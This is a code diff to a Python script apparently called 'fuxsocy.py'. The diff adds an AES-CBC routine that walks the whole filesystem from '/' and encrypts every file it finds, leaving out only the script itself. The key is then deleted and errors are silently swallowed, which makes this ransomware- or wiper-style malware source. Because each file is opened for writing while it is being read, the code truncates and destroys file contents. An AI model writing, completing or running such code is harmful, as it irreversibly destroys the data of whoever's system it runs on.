@@ -10,6 +10,29 @@ from Crypto import Random
 
 SALT = 'fsociety'
 START = '/'
+CS = 64 * 1024
+
+
+def encrypt(root, filename, key):
+    if ('fuxsocy.py' not in filename):
+        filepath = root + '/' + filename
+        filesize = str(os.path.getsize(filepath)).zfill(16)
+        iv = Random.new().read(16)
+        encryptor = AES.new(key, AES.MODE_CBC, iv)
+        try:
+            with open(filepath, 'rb') as infile:
+                with open(filepath, 'wb') as outfile:
+                    outfile.write(filesize.encode('utf-8'))
+                    outfile.write(iv)
+                    while True:
+                        chunk = infile.read(CS)
+                        if len(chunk) == 0:
+                            break
+                        elif len(chunk) % 16 != 0:
+                            chunk += b' ' * (16 - (len(chunk) % 16))
+                        outfile.write(encryptor.encrypt(chunk))
+        except:
+            pass
 
 
 def recurse(dir, key):
@@ -22,6 +45,7 @@ def recurse(dir, key):
         try:
             # Start encrypting
             print('Encrypting files')
+            encrypt(root, file, key)
         except:
             pass
 
@@ -33,6 +57,7 @@ def recurse(dir, key):
                 for subfile in subfiles:
                     try:
                         print('Encrypting subfiles')
+                        encrypt(next(os.walk(os.path.join(root, di)))[0], subfile, key)
                     except:
                         pass
                 if len(subdirs) > 0:
@@ -110,6 +135,7 @@ def main():
     for file in files:
         try:
             print("Encrypting files in root")
+            encrypt(START, file, key)
         except:
             pass
     del key
